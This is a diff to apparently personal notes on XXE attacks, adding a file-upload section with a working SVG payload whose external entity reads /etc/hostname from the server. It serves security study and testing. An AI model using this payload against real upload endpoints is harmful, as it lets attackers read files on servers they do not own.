@@ -11,3 +11,12 @@ we can use  <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="t
 
 2.xxe using file upload
 
+XML based formats---> SVG and DOCX
+suppose a website allowes file upload then we can use either of these extentions to uplaod our file on server with our payload
+
+even if only jpg nad png are allowed we can upload the SVG file format
+
+the svg should look like this --> 
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+then we need to upload file to get XXE
